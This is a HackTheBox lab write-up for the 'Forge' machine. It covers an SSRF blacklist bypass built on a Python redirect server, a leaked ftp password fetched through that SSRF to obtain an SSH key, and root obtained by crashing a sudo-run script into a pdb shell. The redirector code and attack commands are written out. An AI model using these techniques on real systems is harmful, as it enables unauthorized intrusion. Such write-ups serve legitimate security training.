---
title: "Forge"
date: 2022-08-04
summary: "Writeup for the Forge lab machine from HackTheBox"
draft: false
tags: [Hacking]
categories: [HackTheBox]
cover:
    image: "https://www.hackthebox.com/storage/avatars/0ca81b73efd1c8a45732183a34b54d3a.png" # image path/url
    alt: "Forge" # alt text
    caption: "" # display caption under cover
    relative: false # when using page bundles set this to true
---

# Introduction

This was a very interesting box to crack. Initial enumeration shows two websites, http://admin.forge.htb and http://forge.htb are available. The admin page is only accessable via localhost, and the other site just lets you upload images. We are able to use ssrf techniques on the url image upload option to view the admin page. The admin page then reveals credentials for the ftp service and how to access it. From there, we can grab the ftp users ssh key from the ftp share and ssh into the machine. The ftp user is allowed to run a script as sudo that opens a pdb instance on an exception. We can force it to crash and then run python code in the pdb shell to get a root shell.

## Enumeration

### Nmap

```nohighlight
# Nmap 7.92 scan initiated Wed Jul 27 18:34:26 2022 as: nmap -sS -sCV -oA scans/nmap/init 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 27 18:34:35 2022 -- 1 IP address (1 host up) scanned in 9.23 seconds
```

### Websites

Nmap shows that port 80 redirects to http://forge.htb, so we add it to /etc/hosts and run `gobuster vhost` to see if there are any subdomains

```nohighlight
trent@kali[Forge]$ gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/07/27 18:49:01 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]

===============================================================
2022/07/27 18:49:25 Finished
===============================================================
```

We find an admin subdomain and add that to /etc/hosts as well

```nohighlight
trent@kali[Forge]$ cat /etc/hosts
...
10.10.11.111    forge.htb admin.forge.htb
...
```

### Admin subdomain

The admin page is only viewable on localhost, so this is currently a dead end

![Admin interface only available on localhost](./images/website/admin/only_localhost_allowed.png)

### Image Gallery

http://forge.htb looks to be a website to upload and display images. Of note, it allows uploading images from a user supplied url.

![Homepage for http://forge.htb](./images/website/homepage.png)
![Upload from url](./images/website/upload_from_url.png)

Listening for the response in `netcat` shows that the request was made with python requests, so this is likely a small python web application.

![python-requests version](./images/website/python_requests_callback.png)

After uploading a file, it generates a link that the image can be viewed at.
There does not seem to be a filetype restriction, but the generated link will
try to render the page with application type image/jpg.

![Generated link](./images/website/generated_link.png)
![Corrupt image](./images/website/image_corrupt.png)


Trying to put in anything other then an http/https url fails, and it does not allow requests to itself via localhost or the domain. 
![Blacklist protocols](./images/website/only_supports_http_and_https_for_url_uploads.png)
![Blacklisted urls](./images/website/forge_htb_blacklisted_url_uploads.png)

### SSRF

We can get around the address blacklist by redirecting the initial request back to our intended address. we can do this with a python script that listens for requests from the server and sends back a redirect.

```python
#!/usr/bin/env python3

# https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#bypass-via-redirect
# python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

When we send the redirect request, we can give it blacklisted urls and they will be accepted. Navigating to the generated link in the browser will warn us that the image is corrupt, but we can still see the contents of the request in Burpsuite

![Successful ssrf attack](./images/website/admin/homepage_html_via_ssrf_redirect.png)

## Shell as user

On http://admin.forge.htb/announcements, we can find the credentials for an ftp user. It also mentions that the admin /upload page accepts ftp/ftps requests and how to make the request.

![FTP credentials and internal /upload](./images/website/admin/announcements.png)

We can use the same redirect script we did before, and have it redirect to http://admin.forge.htb/upload, and try to upload the contents of the ftp share.

```class="nohighlight"
trent@kali[Forge]$ ./redirect.py "http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123%21@10.10.11.111"
10.10.11.111 - - [28/Jul/2022 17:14:08] "GET / HTTP/1.1" 302 -

```
Navigating to the generated link shows us the ftp share contents in Burpsuite

![FTP contents](./images/ftp/contents_of_ftp_folder.png)

Checking to see if /.ssh is available also yields good results, and we are able to get an ssh key for the ftp user

![ftp ssh folder](./images/ftp/ssh_folder.png)
![ftp id_rsa](./images/ftp/id_rsa.png)

From there, we can ssh into the machine as "user"

![Shell as user](./images/shell_as_user.png)
![User flag](./images/user_get.png)

## Shell as root

### Sudo remote-manage.py

Running linpeas shows that the ftp user can run the remote-manage.py script as root without a password

![linpeas sudo -l results](./images/linpeas/sudo_l.png)

```python
# /opt/remote-manage.py

#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

### PDB shell

What the script actually does is unable to be exploited in any useful way, but when the script crashes it runs pdb. In a pdb shell, we can run python commands as if we were in a python repl, and could thus execute code as root. In order to make it crash, we can just spam a ton of A's into the prompt.

In order to do this, we have to run the script in one ssh session, and then open another ssh session to interact with the socket and make it crash. Once we have a pdb shell, we can import os and run bash as root.

![Shell as root](./images/shell_as_root.png)
![Root flag](./images/root_get.png)
